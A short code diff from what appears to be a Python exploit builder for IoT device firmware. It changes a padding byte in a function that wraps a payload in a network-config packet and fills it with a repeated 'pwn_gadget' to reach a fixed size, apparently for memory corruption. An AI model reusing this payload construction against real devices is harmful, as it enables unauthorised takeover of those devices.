@@ -246,7 +246,7 @@ def make_profile_format1(chipset, ty_cjson_parse_addr, mf_cmd_process_addr):
     payload = profile_builder.check_valid_payload(payload)
 
     datagram = profile_builder.build_network_config_packet(payload=payload)
-    datagram_padding = b'B' * (4 - (len(datagram) % 4))
+    datagram_padding = b'A' * (4 - (len(datagram) % 4))
     datagram_padding += pwn_gadget * ((256-len(datagram+datagram_padding))//4)
 
     data = {
